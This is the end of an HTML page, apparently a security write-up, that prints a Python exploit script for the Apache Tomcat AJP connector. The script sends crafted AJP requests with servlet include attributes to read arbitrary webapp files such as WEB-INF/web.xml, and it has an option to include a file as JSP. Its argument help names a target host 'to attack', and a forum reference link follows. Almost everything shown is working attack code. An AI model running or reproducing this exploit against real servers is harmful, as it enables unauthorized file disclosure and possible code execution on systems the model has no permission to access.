class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return fr</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">class Tomcat(object):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def __init__(self, target_host, target_port):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.target_host = target_host</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.target_port = target_port</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.socket.connect((target_host, target_port))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.stream = self.socket.makefile(&quot;rb&quot;, bufsize=0)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def perform_request(self, req_uri, headers={}, method=&#39;GET&#39;, user=None, password=None, attributes=[], lfi=False):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if lfi:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.req_uri = req_uri + &#39;.jspx&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.req_uri = req_uri</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.forward_request = prepare_ajp_forward_request(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Getting resource at ajp13://%s:%d%s&quot; %</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(self.target_host, self.target_port, req_uri))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if user is not None and password is not None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.forward_request.request_headers[&#39;SC_REQ_AUTHORIZATION&#39;] = &quot;Basic &quot; + (</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;%s:%s&quot; % (user, password)).encode(&#39;base64&#39;).replace(&#39;\n&#39;, &#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for h in headers:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.forward_request.request_headers[h] = headers[h]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for a in attributes:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.forward_request.attributes.append(a)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;responses = self.forward_request.send_and_receive(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.socket, self.stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if len(responses) == 0:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return None, None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snd_hdrs_res = responses[0]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data_res = responses[1:-1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if len(data_res) == 0:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;No data in response. Headers:%s\n&quot; %</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snd_hdrs_res.response_headers)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return snd_hdrs_res, data_res</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">parser = argparse.ArgumentParser()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&quot;target&quot;, type=str, help=&quot;Hostname or IP to attack&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, type=int, default=8009,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;AJP port to attack (default is 8009)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&#39;-w&#39;, &#39;--webapp&#39;, type=str, default=&#39;ROOT&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;Which webapp to attack (default is ROOT&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&#39;-f&#39;, &#39;--file&#39;, type=str,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default=&#39;WEB-INF/web.xml&#39;, help=&quot;file path :(WEB-INF/web.xml)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&#39;-l&#39;, &#39;--lfi&#39;, action=&quot;store_true&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;local file include&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">args = parser.parse_args()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">t = Tomcat(args.target, args.port)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">_, data = t.perform_request(&#39;/&#39;+args.webapp+&#39;/&#39;, attributes=[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;javax.servlet.include.request_uri&#39;, &#39;/&#39;]},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;javax.servlet.include.path_info&#39;, args.file]},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;javax.servlet.include.servlet_path&#39;, &#39;/&#39;]},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">], lfi=args.lfi)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&#39;----------------------------&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;&quot;.join([d.data for d in data]))</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://forum.90sec.com/t/topic/801"><span class="cs4B51D5E4">https://forum.90sec.com/t/topic/801</span></a></span></p></body>
</html>
